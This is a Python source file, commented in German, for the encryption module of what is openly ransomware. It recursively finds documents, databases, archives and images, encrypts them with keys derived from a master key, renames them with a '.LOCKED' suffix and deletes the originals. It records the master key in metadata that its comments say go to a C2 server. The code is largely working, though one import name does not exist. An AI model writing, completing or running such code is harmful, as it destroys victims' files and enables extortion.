#!/usr/bin/env python3
"""
ENCRYPTION ENGINE
=================
AES-256 Encryption mit PBKDF2 Key Derivation
Wird auf Victim ausgeführt - verschlüsselt Dateien
"""

import os
import json
import base64
import hashlib
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HmacSHA256
from cryptography.hazmat.backends import default_backend

class EncryptionEngine:
    """
    AES-256 Encryption Engine
    Verschlüsselt Dateien und generiert Master-Key
    """
    
    def __init__(self, encryption_extension=".LOCKED", pbkdf2_iterations=100000):
        """
        Initialisiere Encryption Engine
        
        Args:
            encryption_extension: Suffix für verschlüsselte Dateien
            pbkdf2_iterations: PBKDF2 Iterations für Key Derivation
        """
        self.master_key = os.urandom(32)  # 256-bit Master Key
        self.encryption_extension = encryption_extension
        self.pbkdf2_iterations = pbkdf2_iterations
        
        self.encrypted_files = []
        self.total_size_encrypted = 0
        self.failed_files = []
        
        # Encryption Metadata
        self.metadata = {
            'master_key_hex': base64.b64encode(self.master_key).decode(),
            'extension': encryption_extension,
            'pbkdf2_iterations': pbkdf2_iterations,
            'timestamp': datetime.now().isoformat(),
            'total_files': 0,
            'total_size_gb': 0.0
        }
    
    def derive_key(self, salt, iterations=None):
        """
        Leite Encryption-Key vom Master-Key ab
        
        PBKDF2HmacSHA256(master_key, salt, iterations) = file_key
        """
        if iterations is None:
            iterations = self.pbkdf2_iterations
        
        kdf = PBKDF2HmacSHA256(
            algorithm=hashes.SHA256(),
            length=32,  # 256-bit
            salt=salt,
            iterations=iterations,
            backend=default_backend()
        )
        
        key_bytes = kdf.derive(self.master_key)
        return base64.urlsafe_b64encode(key_bytes)
    
    def encrypt_file(self, file_path, verbose=True):
        """
        Verschlüssele eine einzelne Datei
        
        Format:
          [Salt (16 bytes)] + [Encrypted Data]
        """
        try:
            file_path = Path(file_path)
            
            if not file_path.exists():
                if verbose:
                    print(f"[!] File not found: {file_path}")
                self.failed_files.append(str(file_path))
                return False
            
            # Datei lesen
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            file_size = len(file_data)
            
            # Zufälligen Salt generieren (16 bytes)
            salt = os.urandom(16)
            
            # Key ableiten
            encryption_key = self.derive_key(salt)
            
            # Mit Fernet verschlüsseln (AES-128-CBC)
            cipher = Fernet(encryption_key)
            encrypted_data = cipher.encrypt(file_data)
            
            # Neue Datei schreiben: Salt + Encrypted Data
            encrypted_path = file_path.with_suffix(file_path.suffix + self.encryption_extension)
            
            with open(encrypted_path, 'wb') as f:
                f.write(salt + encrypted_data)
            
            # Original-Datei sichern löschen
            os.remove(file_path)
            
            # Statistik
            self.encrypted_files.append({
                'original_path': str(file_path),
                'encrypted_path': str(encrypted_path),
                'size_bytes': file_size,
                'salt_hex': base64.b64encode(salt).decode()
            })
            self.total_size_encrypted += file_size
            
            if verbose:
                print(f"[✓] Encrypted: {file_path.name} ({file_size / 1024:.1f} KB)")
            
            return True
        
        except PermissionError:
            if verbose:
                print(f"[!] Permission denied: {file_path}")
            self.failed_files.append(str(file_path))
            return False
        
        except Exception as e:
            if verbose:
                print(f"[!] Error encrypting {file_path}: {e}")
            self.failed_files.append(str(file_path))
            return False
    
    def encrypt_directory(self, directory, target_extensions=None, recursive=True, verbose=True):
        """
        Verschlüssele alle Dateien in einem Verzeichnis
        
        Args:
            directory: Verzeichnis zum scannen
            target_extensions: Set von Datei-Endungen (z.B. {'.txt', '.docx'})
            recursive: Rekursiv in Unterverzeichnissen?
            verbose: Debug-Ausgabe?
        """
        directory = Path(directory)
        
        if not directory.exists():
            if verbose:
                print(f"[!] Directory not found: {directory}")
            return False
        
        if target_extensions is None:
            # Standard High-Value Extensions
            target_extensions = {
                '.docx', '.xlsx', '.pptx', '.pdf',
                '.sql', '.mdb', '.accdb', '.db',
                '.zip', '.rar', '.7z',
                '.jpg', '.png', '.gif', '.bmp',
                '.txt', '.csv', '.json'
            }
        
        encrypted_count = 0
        
        if recursive:
            glob_pattern = '**/*'
        else:
            glob_pattern = '*'
        
        for file_path in directory.glob(glob_pattern):
            if file_path.is_file() and file_path.suffix.lower() in target_extensions:
                if self.encrypt_file(file_path, verbose):
                    encrypted_count += 1
        
        self.metadata['total_files'] = len(self.encrypted_files)
        self.metadata['total_size_gb'] = self.total_size_encrypted / (1024 ** 3)
        
        if verbose:
            print(f"\n[+] Encryption complete:")
            print(f"    Files encrypted: {encrypted_count}")
            print(f"    Total size: {self.total_size_encrypted / (1024 ** 3):.2f} GB")
            print(f"    Failed: {len(self.failed_files)}")
        
        return encrypted_count > 0
    
    def get_master_key_hex(self):
        """Gib Master-Key als Hex-String zurück"""
        return base64.b64encode(self.master_key).decode()
    
    def save_metadata(self, output_file):
        """
        Speichere Encryption-Metadaten
        (wird verschlüsselt zum C2 Server gesendet)
        """
        self.metadata['encrypted_files'] = self.encrypted_files
        self.metadata['failed_files'] = self.failed_files
        
        with open(output_file, 'w') as f:
            json.dump(self.metadata, f, indent=2)
        
        return True
    
    def get_metadata_json(self):
        """Gib Metadaten als JSON zurück"""
        self.metadata['encrypted_files'] = self.encrypted_files
        self.metadata['failed_files'] = self.failed_files
        return json.dumps(self.metadata, indent=2)
